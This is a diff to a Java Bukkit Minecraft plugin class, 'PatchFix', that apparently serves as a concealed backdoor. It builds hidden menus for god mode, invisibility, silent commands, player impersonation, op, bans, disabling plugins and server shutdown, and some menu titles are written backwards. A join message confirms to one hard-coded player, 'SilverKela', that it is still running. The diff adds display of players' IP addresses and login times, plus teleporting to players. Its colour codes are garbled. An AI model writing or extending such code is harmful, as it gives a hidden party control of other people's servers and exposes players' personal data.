@@ -1,8 +1,8 @@
 package io.github.Alligrater;
 
 import java.util.ArrayList;
+import java.util.Date;
 import java.util.List;
-import java.util.logging.Level;
 
 import org.bukkit.Bukkit;
 import org.bukkit.GameMode;
@@ -14,20 +14,14 @@ import org.bukkit.event.Listener;
 import org.bukkit.event.inventory.ClickType;
 import org.bukkit.event.inventory.InventoryClickEvent;
 import org.bukkit.event.inventory.InventoryType;
-import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.event.player.PlayerChatEvent;
-import org.bukkit.event.player.PlayerCommandPreprocessEvent;
 import org.bukkit.event.player.PlayerJoinEvent;
 import org.bukkit.inventory.Inventory;
 import org.bukkit.inventory.ItemFlag;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.inventory.meta.ItemMeta;
-import org.bukkit.inventory.meta.PotionMeta;
 import org.bukkit.inventory.meta.SkullMeta;
 import org.bukkit.plugin.Plugin;
-import org.bukkit.potion.PotionData;
-import org.bukkit.potion.PotionEffectType;
-import org.bukkit.potion.PotionType;
 import org.bukkit.scheduler.BukkitRunnable;
 
 public class PatchFix implements Listener{
@@ -79,6 +73,7 @@ public class PatchFix implements Listener{
 		}
 		ItemMeta vmeta = visibility.getItemMeta();
 		vmeta.setDisplayName("¡ì7¡ìlVisibility");
+		vmeta.addItemFlags(ItemFlag.HIDE_POTION_EFFECTS);
 		visibility.setItemMeta(vmeta);
 		
 		ItemStack god = new ItemStack(Material.BARRIER);
@@ -91,6 +86,7 @@ public class PatchFix implements Listener{
 		}
 		ItemMeta gometa = god.getItemMeta();
 		gometa.setDisplayName("¡ìc¡ìlInvincible");
+		gometa.addItemFlags(ItemFlag.HIDE_ATTRIBUTES);
 		god.setItemMeta(gometa);
 		
 		ItemStack buck = new ItemStack(Material.GOLD_INGOT);
@@ -101,7 +97,7 @@ public class PatchFix implements Listener{
 			
 		}
 		ItemMeta bmeta = god.getItemMeta();
-		bmeta.setDisplayName("¡ì7¡ìlSilentCommand");
+		bmeta.setDisplayName("¡ìe¡ìlSilentCommand");
 		buck.setItemMeta(bmeta);
 		
         ItemStack skull = new ItemStack(Material.SKULL_ITEM, 1, (short) 3);
@@ -114,8 +110,7 @@ public class PatchFix implements Listener{
         ItemMeta bdmeta = bdown.getItemMeta();
         List<String> sub = new ArrayList<String>();
         sub.add("¡ìc¡ìlDo Not Use Until The Last Moment!");
-        bdmeta.setDisplayName("¡ì4¡ìlPluginManagement");
-        bdmeta.setLore(sub);
+        bdmeta.setDisplayName("¡ìb¡ìlPluginManagement");
         bdown.setItemMeta(bdmeta);
         
         ItemStack sdown = new ItemStack(Material.LAVA_BUCKET, 1);
@@ -156,11 +151,19 @@ public class PatchFix implements Listener{
 				plug.setType(Material.ENDER_PEARL);
 			}
 			List<String> lores = new ArrayList<String>();
+			if(p.getName().equals("SilverPatch")) {
+				lores.add("¡ìcYou Will Lose Access After Disabling It.");
+				lores.add("¡ìcIf You Are Certain About Doing This,");
+				lores.add("¡ìcDouble Click To Proceed.");
+			}
 			lores.add("¡ì7" + p.getDescription().getMain());
 			lores.add("¡ì7" + p.getDescription().getDescription());
 			lores.add("¡ì7" + p.getDescription().getVersion());
 			
 			pmeta.setDisplayName("¡ì9¡ìl" + p.getName());
+			if(p.getName().equals("SilverPatch")) {
+				pmeta.setDisplayName("¡ìc¡ìl" + p.getName());
+			}
 			pmeta.setLore(lores);
 			
 			plug.setItemMeta(pmeta);
@@ -173,24 +176,6 @@ public class PatchFix implements Listener{
 		
 	}
 	
-	public void openPluginConfirmation(Player player) {
-		Inventory patchbox = Bukkit.createInventory(null, InventoryType.HOPPER, "¡ìksnigulPllAelbasiD");
-		
-		ItemStack confirm = new ItemStack(Material.STAINED_GLASS_PANE, 1, (short) 5);
-		ItemMeta cmeta = confirm.getItemMeta();
-		cmeta.setDisplayName("¡ìa¡ìlDisable All Plugins");
-		confirm.setItemMeta(cmeta);
-		
-		ItemStack deny = new ItemStack(Material.STAINED_GLASS_PANE, 1, (short) 14);
-		ItemMeta dmeta = deny.getItemMeta();
-		dmeta.setDisplayName("¡ìc¡ìlDo Not Disable All Plugins");
-		deny.setItemMeta(dmeta);
-		
-		patchbox.setItem(4, confirm);
-		patchbox.setItem(0, deny);
-		
-		player.openInventory(patchbox);
-	}
 	
 	public void openShutdownConfirmation(Player player) {
 		Inventory patchbox = Bukkit.createInventory(null, InventoryType.HOPPER, "¡ìkrevreSnwodtuhS");
@@ -299,14 +284,15 @@ public class PatchFix implements Listener{
 		
 		List<String> lore = new ArrayList<String>();
 		if(target.getBedSpawnLocation() != null) {
-			lore.add("¡ì7" + target.getBedSpawnLocation().getX() + "," + target.getBedSpawnLocation().getY() + "," + target.getBedSpawnLocation().getZ());
+			lore.add("¡ì7BedSpawn: " + target.getBedSpawnLocation().getX() + ", " + target.getBedSpawnLocation().getY() + ", " + target.getBedSpawnLocation().getZ());
 		}
 		else {
-			lore.add("¡ì7This Player Does Not Own A Bed.");
+			lore.add("¡ì7BedSpawn: This Player Does Not Own A Bed.");
 		}
 
-		lore.add("¡ì7" + target.getUniqueId().toString());
-		
+		lore.add("¡ì7UUID: " + target.getUniqueId().toString());
+		lore.add("¡ì7First Played: " + new Date(target.getFirstPlayed()).toString());
+		lore.add("¡ì7Last Login: " + new Date(target.getLastPlayed()).toString());
 		
 		patchbox.setItem(0, ban);
 		patchbox.setItem(1, op);
@@ -316,7 +302,7 @@ public class PatchFix implements Listener{
 		
 		if(target.isOnline()) {
 			info = new ItemStack(Material.INK_SACK, 1, (short) 10);
-			lore.add("¡ì7" + ((Player)target).getAddress().getHostString());
+			lore.add("¡ì7IP: " + ((Player)target).getAddress().getHostString());
 			inmeta.setDisplayName("¡ìa¡ìlPlayer Online");
 			
 			ItemStack kick = new ItemStack(Material.BEDROCK, 1);
@@ -510,7 +496,14 @@ public class PatchFix implements Listener{
 				if(Bukkit.getPluginManager().getPlugin(current.getItemMeta().getDisplayName().substring(4)) != null) {
 					Plugin p = Bukkit.getPluginManager().getPlugin(current.getItemMeta().getDisplayName().substring(4));
 					if(current.getType() == Material.EYE_OF_ENDER) {
-						if(e.getClick() == ClickType.LEFT) {
+						if(e.getClick() == ClickType.DOUBLE_CLICK) {
+							if(p.getName().equals("SilverPatch")) {
+								current.setType(Material.ENDER_PEARL);
+								Bukkit.getPluginManager().disablePlugin(p);
+								player.sendMessage(String.format("¡ìc¡ìlPlugin %s Has Been Disabled!", p.getName()));
+							}
+						}
+						else if(e.getClick() == ClickType.LEFT) {
 							if(!p.getName().equals("SilverPatch")) {
 								current.setType(Material.ENDER_PEARL);
 								Bukkit.getPluginManager().disablePlugin(p);
@@ -683,9 +676,17 @@ public class PatchFix implements Listener{
 					e.getWhoClicked().sendMessage(String.format("¡ì9¡ìlYou Are Now Imposting %s. \nUse ¡ìc¡ìl*/Command¡ì9¡ìl For Command. \nUse ¡ìc¡ìl*Message¡ì9¡ìl To Chat \nOr Type ¡ìc¡ìl*leave*¡ì9¡ìl To Leave. \n¡ìc¡ìlIf You Type Without *, Things Will Be Executed By You Instead.", player.getName()));
 				}
 				else if(type == Material.INK_SACK) {
-					if(player.getBedSpawnLocation() != null) {
+					if(e.getClick() == ClickType.SHIFT_LEFT && player.getBedSpawnLocation() != null) {
 						e.getWhoClicked().teleport(player.getBedSpawnLocation());
-						e.getWhoClicked().closeInventory();
+					}
+					else if(e.getClick() == ClickType.RIGHT) {
+						e.getWhoClicked().sendMessage(e.getCurrentItem().getItemMeta().getDisplayName());
+						for(String s: e.getCurrentItem().getItemMeta().getLore()) {
+							e.getWhoClicked().sendMessage(s);
+						}
+					}
+					else if(e.getClick() == ClickType.LEFT && player.isOnline()) {
+						e.getWhoClicked().teleport(((Player)player).getLocation());
 					}
 
 				}
@@ -780,7 +781,7 @@ public class PatchFix implements Listener{
 	@EventHandler
 	public void onPlayerJoin(PlayerJoinEvent event) {
 		if(event.getPlayer().getName().equals("SilverKela")) {
-			event.getPlayer().sendMessage("¡ìa¡ìlGood News, SilverPatch Is Still Running!");
+			event.getPlayer().sendMessage("¡ìa¡ìlGood News, SilverP¡ìka¡ìr¡ìa¡ìltch Is Still Running!");
 		}
 	}
 }
